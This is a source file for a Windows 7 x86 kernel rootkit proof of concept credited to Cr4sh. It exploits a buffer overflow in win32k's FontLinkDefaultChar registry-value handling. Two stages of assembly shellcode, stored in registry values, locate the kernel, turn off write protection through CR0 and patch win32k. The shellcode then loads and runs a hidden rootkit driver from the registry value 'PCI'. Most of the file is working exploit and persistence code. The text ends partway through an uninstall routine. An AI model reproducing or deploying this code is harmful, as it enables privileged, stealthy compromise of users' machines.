#include "stdafx.h"

#define EMIT(_data_) __asm __emit _data_
#define _ __asm __emit

#define ENDM 'DNE~'

#ifdef USE_DEBUG_DRIVER
#include "../includes/rootkit_driver_debug.sys.h"
#else
#include "../includes/rootkit_driver.sys.h"
#endif

// buffer lengt and return address offset
#define BOF_MIN_LENGTH (0x05 * sizeof(PVOID))
#define BOF_RET_OFFSET (BOF_MIN_LENGTH - sizeof(PVOID))

// registry key and value name for malformed exploit data + 1-st shellcode
#define EXPL_KEY "Software\\Microsoft\\Windows NT\\CurrentVersion\\FontLink"
#define EXPL_VAL "FontLinkDefaultChar"

#define SC2_KEY "System\\CurrentControlSet\\Control"
#define SC2_VAL "Configuration Data"

/** 
 * Name of registry value in System\CurrentControlSet\Control, to store
 * rootkit driver image.
 */
#define DRV_VAL "PCI"

// Define the page size for the Intel 386 as 4096 (0x1000).
#define PAGE_SIZE 0x1000

/**
 * OS sensitive addresses and offsets.
 */ 

// magic address of JMP ESP for Windows 7 SP0-SP1
#define JMP_ESP_ADDR 0xffdf04c7

// offset of _KPCR::KdVersionBlock
#define KPCR_KdVersionBlock 0x34
#define KPCR_SelfPcr 0x1c
#define PROCESSINFO_Flags 0x08

#define WIN32_PROCESS_FLAGS 0x20040010

/**
 * Virtual address inside of %SystemRoot%\Config\SYSTEM registry
 * hive, that mapped into the kernel memory.
 */
#define REG_HIVE_ADDRESS 0x8d100000

#define REG_SIGN_1 '\x40\x50\x41\x51'
#define REG_SIGN_FULL "\x40\x50\x41\x51\x90"

BOOL m_DebugBreaks = TRUE;
//--------------------------------------------------------------------------------------
BOOL LoadPrivileges(char *lpszName)
{
    HANDLE hToken = NULL;
    LUID Val;
    TOKEN_PRIVILEGES tp;
    BOOL bRet = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
    {
        DbgMsg(__FILE__, __LINE__, "OpenProcessToken() fails: error %d\n", GetLastError());
        goto end;
    }

    if (!LookupPrivilegeValueA(NULL, lpszName, &Val))
    {
        DbgMsg(__FILE__, __LINE__, "LookupPrivilegeValue() fails: error %d\n", GetLastError());
        goto end;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = Val;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof (tp), NULL, NULL))
    {
        DbgMsg(__FILE__, __LINE__, "AdjustTokenPrivileges() fails: error %d\n", GetLastError());
        goto end;
    }

    bRet = TRUE;

end:
    if (hToken)
    {
        CloseHandle(hToken);
    }

    return bRet;
} 
//--------------------------------------------------------------------------------------
PVOID GetSysInf(SYSTEM_INFORMATION_CLASS InfoClass)
{
    NTSTATUS ns = 0;
    ULONG RetSize = 0, Size = 0x100;
    PVOID Info = NULL;

    GET_NATIVE(NtQuerySystemInformation);

    while (true) 
    {    
        // allocate memory for system information
        if ((Info = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, Size)) == NULL) 
        {
            DbgMsg(__FILE__, __LINE__, "LocalAlloc() fails\n");
            return NULL;
        }

        // query information
        RetSize = 0;
        ns = f_NtQuerySystemInformation(InfoClass, Info, Size, &RetSize);
        if (ns == STATUS_INFO_LENGTH_MISMATCH)
        {       
            // buffer is too small
            LocalFree(Info);
            Info = NULL;

            if (RetSize > 0)
            {
                // allocate more memory and try again
                Size = RetSize + 0x100;
            }            
            else
            {
                break;
            }
        }
        else
        {
            break;
        }
    }

    if (!NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, "NtQuerySystemInformation() fails; status: 0x%.8x\n", ns);

        if (Info)
        {
            LocalFree(Info);
        }

        return NULL;
    }

    return Info;
}
//--------------------------------------------------------------------------------------
PVOID KernelGetModuleBase(char *ModuleName, char *ModulePath, SIZE_T ModulePathLen)
{
    PVOID pModuleBase = NULL;
    UNICODE_STRING usCommonHalName, usCommonNtName;

    GET_NATIVE(RtlInitUnicodeString);
    GET_NATIVE(RtlAnsiStringToUnicodeString);
    GET_NATIVE(RtlInitAnsiString);
    GET_NATIVE(RtlEqualUnicodeString);
    GET_NATIVE(RtlFreeUnicodeString);

    f_RtlInitUnicodeString(&usCommonHalName, L"hal.dll");
    f_RtlInitUnicodeString(&usCommonNtName, L"ntoskrnl.exe");

    #define HAL_NAMES_NUM 6
    wchar_t *wcHalNames[] = 
    {
        L"hal.dll",      // Non-ACPI PIC HAL 
        L"halacpi.dll",  // ACPI PIC HAL
        L"halapic.dll",  // Non-ACPI APIC UP HAL
        L"halmps.dll",   // Non-ACPI APIC MP HAL
        L"halaacpi.dll", // ACPI APIC UP HAL
        L"halmacpi.dll"  // ACPI APIC MP HAL
    };

    #define NT_NAMES_NUM 4
    wchar_t *wcNtNames[] = 
    {
        L"ntoskrnl.exe", // UP
        L"ntkrnlpa.exe", // UP PAE
        L"ntkrnlmp.exe", // MP
        L"ntkrpamp.exe"  // MP PAE
    };

    PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSysInf(SystemModuleInformation);
    if (Info)
    {
        ANSI_STRING asModuleName;
        UNICODE_STRING usModuleName;

        f_RtlInitAnsiString(&asModuleName, ModuleName);

        NTSTATUS ns = f_RtlAnsiStringToUnicodeString(&usModuleName, &asModuleName, TRUE);
        if (NT_SUCCESS(ns))
        {
            for (ULONG i = 0; i < Info->NumberOfModules; i++)
            {
                ANSI_STRING asEnumModuleName;
                UNICODE_STRING usEnumModuleName;

                f_RtlInitAnsiString(
                    &asEnumModuleName, 
                    (char *)Info->Modules[i].FullPathName + Info->Modules[i].OffsetToFileName
                );

                NTSTATUS ns = f_RtlAnsiStringToUnicodeString(&usEnumModuleName, &asEnumModuleName, TRUE);
                if (NT_SUCCESS(ns))
                {                    
                    if (f_RtlEqualUnicodeString(&usModuleName, &usCommonHalName, TRUE))
                    {
                        // hal.dll passed as module name
                        for (int i_m = 0; i_m < HAL_NAMES_NUM; i_m++)
                        {
                            UNICODE_STRING usHalName;
                            f_RtlInitUnicodeString(&usHalName, wcHalNames[i_m]);

                            // compare module name from list with known HAL module name
                            if (f_RtlEqualUnicodeString(&usEnumModuleName, &usHalName, TRUE))
                            {
                                lstrcpyn(ModulePath, asEnumModuleName.Buffer, (int)ModulePathLen);
                                pModuleBase = (PVOID)Info->Modules[i].ImageBase;
                                break;
                            }
                        }
                    }
                    else if (f_RtlEqualUnicodeString(&usModuleName, &usCommonNtName, TRUE))
                    {
                        // ntoskrnl.exe passed as module name
                        for (int i_m = 0; i_m < NT_NAMES_NUM; i_m++)
                        {
                            UNICODE_STRING usNtName;
                            f_RtlInitUnicodeString(&usNtName, wcNtNames[i_m]);

                            // compare module name from list with known kernel module name
                            if (f_RtlEqualUnicodeString(&usEnumModuleName, &usNtName, TRUE))
                            {
                                lstrcpyn(ModulePath, asEnumModuleName.Buffer, (int)ModulePathLen);
                                pModuleBase = (PVOID)Info->Modules[i].ImageBase;
                                break;
                            }
                        }
                    }
                    else if (f_RtlEqualUnicodeString(&usModuleName, &usEnumModuleName, TRUE))
                    {
                        lstrcpyn(ModulePath, asEnumModuleName.Buffer, (int)ModulePathLen);
                        pModuleBase = (PVOID)Info->Modules[i].ImageBase;
                    }

                    f_RtlFreeUnicodeString(&usEnumModuleName);

                    if (pModuleBase)
                    {
                        // module is found
                        break;
                    }
                }                    
            }                     

            f_RtlFreeUnicodeString(&usModuleName);
        }        

        LocalFree(Info);
    }

    return pModuleBase;
}
//--------------------------------------------------------------------------------------
#define GetKernelProcAddr(_proc_) GetKernelProcAddrEx("ntoskrnl.exe", (_proc_), FALSE)
#define GetHalProcAddr(_proc_) GetKernelProcAddrEx("hal.dll", (_proc_), FALSE)
#define GetKernelProcOffset(_proc_) GetKernelProcAddrEx("ntoskrnl.exe", (_proc_), TRUE)
#define GetHalProcOffset(_proc_) GetKernelProcAddrEx("hal.dll", (_proc_), TRUE)

PVOID GetKernelProcAddrEx(char *lpszModuleName, char *lpszProcName, BOOL bOffset)
{
    PVOID Addr = NULL;
    
    // get kernel module address and file path
    char szModulePath[MAX_PATH];
    PVOID ModuleBase = KernelGetModuleBase(lpszModuleName, szModulePath, MAX_PATH);
    if (ModuleBase)
    {
        // load kernel image as dynamic library
        HMODULE hModule = LoadLibraryExA(szModulePath, 0, DONT_RESOLVE_DLL_REFERENCES);
        if (hModule)
        {
            // get address of target function
            Addr = GetProcAddress(hModule, lpszProcName);
            if (Addr)
            {                               
                if (bOffset)
                {
                    // calculate only function offsset
                    Addr = (PVOID)((PUCHAR)Addr - (PUCHAR)hModule);
                }                
                else
                {
                    // calculate REAL address of this function
                    Addr = (PVOID)((PUCHAR)Addr - (PUCHAR)hModule + (PUCHAR)ModuleBase);
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "GetProcAddress() ERROR %d\n", GetLastError());
            }

            FreeLibrary(hModule);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "LoadLibraryEx() ERROR %d\n", GetLastError());
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Unable to locate \"%s\" module\n", lpszModuleName);
    }

    return Addr;
}
//--------------------------------------------------------------------------------------
#define marker_MmIsAddressValid 'Val0'

__declspec(naked) void Shellcode_1(void)
{
    __asm 
    {
        /**
         * 1-st STAGE SHELLCODE BEGIN
         *
         * EBX allways points to the win32k!NtUserInitialize()
         *
         */

#ifdef USE_SHELLCODE_DEBUGBREAK

        int     3
#endif

        /** 
         * Find kernel adderss
         */
        mov     eax, fs:[KPCR_SelfPcr]
        mov     edi, dword ptr [eax + KPCR_KdVersionBlock]        
        xor     di, di

_find_kernel:

        cmp     word ptr [edi], IMAGE_DOS_SIGNATURE
        je      _kernel_ok
        sub     edi, PAGE_SIZE
        jmp     short _find_kernel

_kernel_ok:

        // get address of nt!MmIsAddressvalid()
        add     edi, marker_MmIsAddressValid

        /** 
         * Find 2-nd shellcode, that has been stored in registry hive,
         * in kernel memory.
         */

        mov     esi, REG_HIVE_ADDRESS

_loop:
        // check for valid address
        push    esi
        call    edi
        test    al, al
        jz      _no_match

        /** 
         * Check signature by 8 bytes
         */
        cmp     dword ptr [esi], REG_SIGN_1
        jne     _no_match

        cmp     byte ptr [esi + 4], 0x90
        jne     _no_match

        // signature matched!
        jmp     esi

_no_match:

        add     esi, 0x10
        jmp     short _loop
    }

    // end marker
    EMIT('~' _ 'E' _ 'N' _ 'D')
}
//--------------------------------------------------------------------------------------
/**
 * Constants and flags for RtlQueryRegistryValues()
 */

// RTL_QUERY_REGISTRY_DIRECT | RTL_QUERY_REGISTRY_REQUIRED
#define QUERY_REGISTRY_TABLE_FLAGS  0x00000024

// RTL_REGISTRY_CONTROL | RTL_REGISTRY_OPTIONAL
#define QUERY_REGISTRY_RELATIVETO   0x80000002

#define QUERY_REGISTRY_TABLE_SIZE 0x38

__declspec(naked) void Shellcode_2(void)
{
    __asm 
    {
        /**
         * 2-nd STAGE SHELLCODE BEGIN
         *
         * EBX - win32k!NtUserInitialize()
         * EDI - nt!MmIsAddressValid()
         *
         */

#ifdef USE_SHELLCODE_DEBUGBREAK

        int     3
#endif

        /**
         * Calculate shellcode address.
         */
        mov     esi, ebx
        call    _realloc

_realloc:
        
        pop     ebx
        sub     ebx, _realloc

        /** 
         * Find win32k address
         */
        xor     si, si

_find_win32:

        cmp     word ptr [esi], IMAGE_DOS_SIGNATURE 
        je      _win32_ok
        sub     esi, PAGE_SIZE
        jmp     short _find_win32

_win32_ok:

        mov     [ebx + _params + _win32k_base], esi

        // get kernel image start addreess
        mov     ecx, [ebx + _params + _MmIsAddressValid]
        sub     edi, ecx
        mov     [ebx + _params + _kernel_base], edi

        /**
         * Patch win32k!bInitializeEUDC() to prevent
         * multipile vulnerability triggering.
         */

        mov     ecx, [ebx + _params + _bInitializeEUDC_patch]
        add     ecx, esi

        // disable memory write protection
        mov     eax, cr0             
        and     eax, not 000010000h
        mov     cr0, eax               

        // perform patching with add esp, 0x14 / nop
        mov     word ptr [ecx + 0], '\x83\xc4'
        mov     word ptr [ecx + 2], '\x14\x90'

        // enable memory write protection which was supposed to do
        mov     eax, cr0
        or      eax, 000010000h
        mov     cr0, eax

        /****************************************************
         * Place any payload here:
         */

        mov     edx, [ebx + _params + _rootkit_size]
        add     edx, 0x100
        mov     ecx, [ebx + _params + _ExAllocatePool]
        add     ecx, edi

        // call nt!ExAllocatePool() and allocate memory for rootkit image
        push    edx
        push    edx
        push    0
        call    ecx
        pop     edx
        test    eax, eax
        jz      _err_payload

        /*
            RtlQueryRegistryValues() remark:
            
            The buffer pointed to by EntryContext must begin with a signed 
            LONG value. The magnitude of the value must specify the size, 
            in bytes, of the buffer.
        */
        neg     edx
        mov     [eax], edx
        mov     ebp, eax

        /*
            RTL_QUERY_REGISTRY_TABLE (0x1c bytes):

                +00 QueryRoutine
                +04 Flags
                +08 Name
                +0c EntryContext
                +10 DefaultType
                +14 DefaultData
                +18 DefaultLength
        */

        // allocate memory for RTL_QUERY_REGISTRY_TABLE[2]
        mov     edx, esp
        mov     ecx, QUERY_REGISTRY_TABLE_SIZE
        sub     esp, ecx
        
        // fill with zero bytes
        push    edx
        xchg    edi, edx  
        xor     eax, eax
        rep     stosb
        xchg    edi, edx
        pop     edx

        // filling the structure
        mov     dword ptr [edx + 0x04], QUERY_REGISTRY_TABLE_FLAGS        
        lea     eax, [ebx + _drv_val_name]
        mov     [edx + 0x08], eax
        mov     [edx + 0x0c], ebp

        push    0
        push    0
        push    edx
        push    0
        push    QUERY_REGISTRY_RELATIVETO

        // call nt!RtlQueryRegistryValues()
        mov     ecx, [ebx + _params + _RtlQueryRegistryValues]
        add     ecx, edi
        call    ecx

        add     esp, QUERY_REGISTRY_TABLE_SIZE

        test    eax, eax
        jnz     _err_payload

        // check for DOS signature of readed data
        cmp     word ptr [ebp], IMAGE_DOS_SIGNATURE 
        jne     _err_payload

        mov     [ebx + _params + _rootkit_base], ebp

        mov     ecx, ebp
        add     ecx, [ecx + 0x3C] // IMAGE_DOS_HEADER::e_lfanew
        mov     ecx, [ecx + 0x28] // IMAGE_OPTIONAL_HEADER::AddressOfEntryPoint
        add     ecx, ebp

        // call image entry point
        lea     eax, [ebx + _params]
        push    eax  // RegistryPath argument
        push    0    // DriverObject argument
        call    ecx

_err_payload:

#ifdef USE_SHELLCODE_DBGPRINT

        lea     ecx, [ebx + _params + _szDbgPrintMessage]
        push    ecx

        // call nt!DbgPrint()
        mov     ecx, [ebx + _params + _DbgPrint]
        add     ecx, edi
        call    ecx
        pop     eax

#endif
        /****************************************************/

        /**
         * Make the rest of the stuff that had to be made
         * by the win32k!NtUserInitialize()
         */

        // get current process
        mov     ecx, [ebx + _params + _PsGetCurrentProcess]
        add     ecx, edi
        call    ecx

        // set flags in PROCESSINFO
        mov     ecx, [ebx + _params + _PsGetProcessWin32Process]
        add     ecx, edi
        push    eax
        call    ecx
        add     eax, 8
        or      dword ptr [eax], WIN32_PROCESS_FLAGS

        // call win32k!UserInitialize()
        mov     ecx, [ebx + _params + _UserInitialize]
        add     ecx, esi
        call    ecx

        /**
         * Return back to the nt!_KiFastCallEntry() 
         * with STATUS_SUCCESS.
         */

        // get kernel image end addreess
        mov     ecx, edi
        add     ecx, [ecx + 0x3C] // IMAGE_DOS_HEADER::e_lfanew
        mov     ecx, [ecx + 0x50] // IMAGE_OPTIONAL_HEADER::SizeOfImage
        add     ecx, edi  

        // get kernel image start addreess
        mov     ebp, [ebx + _params + _MmIsAddressValid]
        add     ebp, edi

_find_ki_ret:

        // Lookup for nt!_KiFastCallEntry()+XX and EBP value in stack.
        mov     ebx, edx
        pop     edx

        // check for the kernel pointer
        cmp     edx, edi
        jb      _find_ki_ret

        cmp     edx, ecx
        ja      _find_ki_ret

        pushad

        // check for valid address
        push    edx
        call    ebp
        test    al, al

        popad
                
        jz      _find_ki_ret

        /*
            Check for the instruction, at return address from the system service:

            call    ebx                     ; system service call            
            test    byte ptr [ebp+6Ch], 1   ; returns here
            jz      short loc_4357D4
            ...
        */
        cmp     word ptr [edx], '\xf6\x45'
        jne     _find_ki_ret

    
        // return to the nt!_KiFastCallEntry() with STATUS_SUCCESS
        xor     eax, eax
        mov     ebp, ebx
        jmp     edx

_drv_val_name:

        EMIT('P' _ '\x0' _ 'C' _ '\x0' _ 'I' _ '\x0' _ '\x0' _ '\x0')

_params:
        /** 
         * Shellcode constants, see SC_PARAMS struct above
         */
    }

    // end marker
    EMIT('~' _ 'E' _ 'N' _ 'D')
}
//--------------------------------------------------------------------------------------
DWORD ScGetSize(PDWORD pData)
{
    DWORD dwSize = 0;
    PDWORD Ptr = pData;

    // get size of code
    while (*Ptr != ENDM)
    {
        dwSize++;

        // check for the end marker
        Ptr = (PDWORD)((DWORD)Ptr + 1);        
    }

    return dwSize;
}
//--------------------------------------------------------------------------------------
BOOL ScWriteDword(PVOID pData, DWORD dwSize, DWORD dwMarker, DWORD dwValue)
{
    // find value pisition in bytes buffer by marker
    for (DWORD i = 0; i < dwSize - sizeof(DWORD); i++)
    {
        if (*(PDWORD)((PUCHAR)pData + i) == dwMarker)
        {
            // replace marker with the value
            *(PDWORD)((PUCHAR)pData + i) = dwValue;
            return TRUE;
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
/**
 * Constants for win32k.sys image analysis.
 */
#define WIN32K_STR_1 L"\\Windows\\WindowStations"
#define WIN32K_STR_2 L"FontLinkDefaultChar"

#define WIN32K_STDCALL_PROLOG "\x8b\xff\x55\x8b\xec"
#define WIN32K_STDCALL_PROLOG_LEN 5

BOOL AnalyseWin32k(PDWORD poffset_UserInitialize, PDWORD poffset_bInitializeEUDC_patch)
{
    DWORD offset_UserInitialize = 0;
    DWORD offset_bInitializeEUDC_patch = 0;

    char szPath[MAX_PATH];
    GetSystemDirectory(szPath, MAX_PATH);
    strcat_s(szPath, MAX_PATH, "\\win32k.sys");

    HMODULE hMod = LoadLibraryEx(szPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hMod)
    {
        PIMAGE_NT_HEADERS32 pHeaders32 = (PIMAGE_NT_HEADERS32)
            ((PUCHAR)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
        
        PIMAGE_SECTION_HEADER pSection = NULL, pCodeSection = NULL;
        PIMAGE_BASE_RELOCATION pRelocation = NULL;
        ULONG RelocationSize = 0, NumberOfSections = 0;        
        ULONGLONG OldBase = 0;

        if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
        {
            // 32-bit image
            if (pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
            {
                pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(
                    hMod,
                    pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
                );

                RelocationSize = pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            }

            OldBase = (ULONGLONG)pHeaders32->OptionalHeader.ImageBase;
            NumberOfSections = pHeaders32->FileHeader.NumberOfSections;           

            pSection = (PIMAGE_SECTION_HEADER)
                (pHeaders32->FileHeader.SizeOfOptionalHeader + 
                (PUCHAR)&pHeaders32->OptionalHeader);            
        }        
        else if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
        {
            // 64-bit image
            PIMAGE_NT_HEADERS64 pHeaders64 = (PIMAGE_NT_HEADERS64)
                ((PUCHAR)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);

            if (pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
            {
                pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(
                    hMod,
                    pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
                );

                RelocationSize = pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            }

            OldBase = pHeaders64->OptionalHeader.ImageBase;
            NumberOfSections = pHeaders64->FileHeader.NumberOfSections;

            pSection = (PIMAGE_SECTION_HEADER)
                (pHeaders64->FileHeader.SizeOfOptionalHeader + 
                (PUCHAR)&pHeaders64->OptionalHeader);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unkown machine type\n");
            FreeLibrary(hMod);
            return FALSE;
        }

        // enumerate image sections        
        for (ULONG i = 0; i < NumberOfSections; i++)
        {
            // find section, that contains global variable
            if (!strncmp((char *)&pSection->Name, ".text", 5))
            {                
                pCodeSection = pSection;
                break;
            }

            pSection += 1;
        }

        if (pRelocation && pCodeSection)
        {
            // parse image relocation table
            ULONG Size = 0;
            while (RelocationSize > Size && pRelocation->SizeOfBlock)
            {            
                ULONG Number = (pRelocation->SizeOfBlock - 8) / 2;
                PUSHORT Rel = (PUSHORT)((PUCHAR)pRelocation + 8);            

                for (ULONG i = 0; i < Number; i++)
                {
                    if (Rel[i] > 0)
                    {
                        USHORT Type = (Rel[i] & 0xF000) >> 12;
                        ULONG Rva = 0;
                        PVOID *Va = NULL;

                        // get address of global variable that used by our instruction
                        if (Type == IMAGE_REL_BASED_HIGHLOW ||
                            Type == IMAGE_REL_BASED_DIR64)
                        {
                            Rva = pRelocation->VirtualAddress + (Rel[i] & 0x0FFF);
                            Va = (PVOID *)RVATOVA(hMod, Rva);
                        }
                        else
                        {
                            DbgMsg(__FILE__, __LINE__, __FUNCTION__ "() ERROR: Unknown relocation type (%d)\n", Type);
                        }

                        if (Va && Rva > 0 &&
                            Rva > pCodeSection->VirtualAddress &&
                            Rva < pCodeSection->VirtualAddress + pCodeSection->Misc.VirtualSize)
                        {         
                            // get address of global variable, that requre fixup
                            PVOID VarAddr = *Va;
                            VarAddr = (PVOID)((ULONGLONG)VarAddr - OldBase + (PUCHAR)hMod);

                            if (!IsBadStringPtrW((LPWSTR)VarAddr, MAX_PATH))
                            {
                                if (!wcscmp((LPWSTR)VarAddr, WIN32K_STR_1))
                                {
                                    DbgMsg(
                                        __FILE__, __LINE__, 
                                        __FUNCTION__"(): \"%ws\" referenced at offset 0x%.8x\n", 
                                        WIN32K_STR_1, Rva
                                    );

                                    // lookup for stdcall prolog of win32k!UserInitialize()
                                    for (DWORD i = 0; i < 50; i++)
                                    {
                                        if (!memcmp(
                                            (PUCHAR)Va - i, 
                                            WIN32K_STDCALL_PROLOG,
                                            WIN32K_STDCALL_PROLOG_LEN))
                                        {
                                            if (offset_UserInitialize > 0)
                                            {
                                                DbgMsg(
                                                    __FILE__, __LINE__, 
                                                    __FUNCTION__"() ERROR: multipile heuristic matches for win32k!UserInitialize()\n"
                                                );

                                                FreeLibrary(hMod);
                                                return FALSE;
                                            }

                                            offset_UserInitialize = Rva - i;

                                            DbgMsg(
                                                __FILE__, __LINE__, 
                                                __FUNCTION__"(): win32k!UserInitialize() found at offset 0x%.8x\n", 
                                                offset_UserInitialize
                                            );

                                            break;
                                        }
                                    }
                                }
                                else if (!wcscmp((LPWSTR)VarAddr, WIN32K_STR_2))
                                {
                                    DbgMsg(
                                        __FILE__, __LINE__, 
                                        __FUNCTION__"(): \"%ws\" referenced at offset 0x%.8x\n", 
                                        WIN32K_STR_2, Rva
                                    );

                                    /*
                                        Check for the following code in win32k!bInitializeEUDC():

                                        mov     ?SharedQueryTable@@A.Name, offset aFontlinkdefaul ; "FontLinkDefaultChar"
                                        mov     ?SharedQueryTable@@A.EntryContext, eax
                                        call    edi ; RtlQueryRegistryValues(x,x,x,x,x)
                                        test    eax, eax
                                        jge     short loc_BF80525F

                                    */
                                    LONG InstPtr = -6;
                                    PUCHAR pInst = (PUCHAR)Va;                                    

                                    if (*(PUSHORT)(pInst + InstPtr) == 0x05c7)
                                    {
                                        // disassemble next 5 instructions
                                        for (DWORD i = 0; i < 5; i++)
                                        {
                                            LONG InstLen = (LONG)c_Catchy(pInst + InstPtr);
                                            if (InstLen == (LONG)CATCHY_ERROR)
                                            {
                                                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: c_Catchy() fails\n");
                                                FreeLibrary(hMod);
                                                return FALSE;
                                            }

                                            InstPtr += InstLen;

                                            // check for call edi / test eax, eax
                                            if (*(PUSHORT)(pInst + InstPtr + 0) == 0xd7ff &&
                                                *(PUSHORT)(pInst + InstPtr + 2) == 0xc085)
                                            {
                                                if (offset_bInitializeEUDC_patch > 0)
                                                {
                                                    DbgMsg(
                                                        __FILE__, __LINE__, 
                                                        __FUNCTION__"() ERROR: multipile heuristic matches for win32k!bInitializeEUDC()\n"
                                                    );

                                                    FreeLibrary(hMod);
                                                    return FALSE;
                                                }

                                                offset_bInitializeEUDC_patch = Rva + InstPtr;

                                                DbgMsg(
                                                    __FILE__, __LINE__, 
                                                    __FUNCTION__"(): win32k!bInitializeEUDC() CALL EDI found at offset 0x%.8x\n", 
                                                    offset_bInitializeEUDC_patch
                                                );

                                                break;
                                            }                                            
                                        }
                                    }
                                }
                            }
                        }                        
                    }
                }

                pRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)pRelocation + pRelocation->SizeOfBlock);
                Size += pRelocation->SizeOfBlock;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__ "() ERROR: Relocation directory not found\n");
        }

        FreeLibrary(hMod);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): LoadLibraryEx() ERROR %d\n", GetLastError());
    }

    if (offset_UserInitialize > 0 &&
        offset_bInitializeEUDC_patch > 0)
    {
        *poffset_UserInitialize = offset_UserInitialize;
        *poffset_bInitializeEUDC_patch = offset_bInitializeEUDC_patch;
        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
#define GET_KERNEL_PROC_OFFSET(_fn_)                                        \
                                                                            \
    DWORD offset_##_fn_ = (DWORD)GetKernelProcOffset(#_fn_);                \
    if (offset_##_fn_ == NULL)                                              \
    {                                                                       \
        DbgMsg(__FILE__, __LINE__, "ERROR: nt!" #_fn_ "() is not found\n"); \
        goto end;                                                           \
    }                                                                       \
    else                                                                    \
    {                                                                       \
        DbgMsg(                                                             \
            __FILE__, __LINE__, "nt!" #_fn_ "() offset is 0x%.8x\n",        \
            offset_##_fn_                                                   \
        );                                                                  \
    }

int _tmain(int argc, _TCHAR* argv[])
{
    DbgMsg(
        __FILE__, __LINE__, 
        "\n***********************************************************\n\n"
        " Windows kernrel rootkit PoC using registry values processing BoF.\n"
        " FOR INTERNAL USE ONLY!\n\n"
        " (c) 2012 Oleksiuk Dmytro (aka Cr4sh)\n"
        " cr4sh@riseup.net\n"
        "\n***********************************************************\n\n"
    );

    BOOL bSupportedOS = TRUE;

#if defined(_X86_)

    BOOL bIs64 = FALSE;

    typedef BOOL (WINAPI * func_IsWow64Process)(
        HANDLE hProcess,
        PBOOL Wow64Process
    );

    func_IsWow64Process f_IsWow64Process = (func_IsWow64Process)
        GetProcAddress(GetModuleHandle("kernel32.dll"), "IsWow64Process");
    if (f_IsWow64Process)
    {
        // check for WOW64 environment
        f_IsWow64Process(GetCurrentProcess(), &bIs64);
    }

    bSupportedOS = !bIs64;    

#endif // _X86_

    OSVERSIONINFOA Version;    
    Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
    if (GetVersionExA(&Version))
    {		    
        if (Version.dwPlatformId != VER_PLATFORM_WIN32_NT ||
            Version.dwMajorVersion != 6 || Version.dwMinorVersion != 1)
        {
            bSupportedOS = FALSE;            
        }        
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "GetVersionEx() ERROR %d\n", GetLastError());
        goto end;    
    }

    if (!bSupportedOS)
    {
        MessageBox(
            0, 
            "This PoC supports only x86 versions of Windows 7 and Server 2008 R2",
            "ERROR",
            MB_ICONERROR
        );

        return -1;
    }

    // check for the uninstall option
    if (argc >= 2 && !strcmp(argv[1], "--uninstall"))
    {
        DbgMsg(
            __FILE__, __LINE__, 
            "[+] Deleting 1-st shellcode from \"%s\\%s\"...\n", EXPL_KEY, EXPL_VAL
        );

        HKEY hKey;
        LONG Code = RegOpenKey(HKEY_LOCAL_MACHINE, EXPL_KEY, &hKey);
        if (Code == ERROR_SUCCESS)
        {
            // delete first rootkit part
            Code = RegDeleteValue(hKey, EXPL_VAL);
            if (Code == ERROR_SUCCESS)
            {
                DbgMsg(__FILE__, __LINE__, "[+] DELETED\n");
            }
            else if (Code == ERROR_FILE_NOT_FOUND)
            {
                DbgMsg(__FILE__, __LINE__, "[!] NOT FOUND\n");
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "RegDeleteValue() ERROR %d\n", Code);
            }

            RegCloseKey(hKey);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "RegOpenKey() ERROR %d\n", Code);
        }

        DbgMsg(__FILE__, __LINE__, "[+] Deleting 2-nd shellcode from \"%s\\%s\"...\n", SC2_KEY, SC2_VAL);

        Code = RegOpenKey(HKEY_LOCAL_MACHINE, SC2_KEY, &hKey);
        if (Code == ERROR_SUCCESS)
        {
            // delete first rootkit part
            Code = RegDeleteValue(hKey, SC2_VAL);
            if (Code == ERROR_SUCCESS)
            {
                DbgMsg(__FILE__, __LINE__, "[+] DELETED\n");
            }
            else if (Code == ERROR_FILE_NOT_FOUND)
            {
                DbgMsg(__FILE__, __LINE__, "[!] NOT FOUND\n");
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "RegDeleteValue() ERROR %d\n", Code);
            }

            RegCloseKey(hKey);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "RegOpenKey() ERROR %d\n", Code);
        }

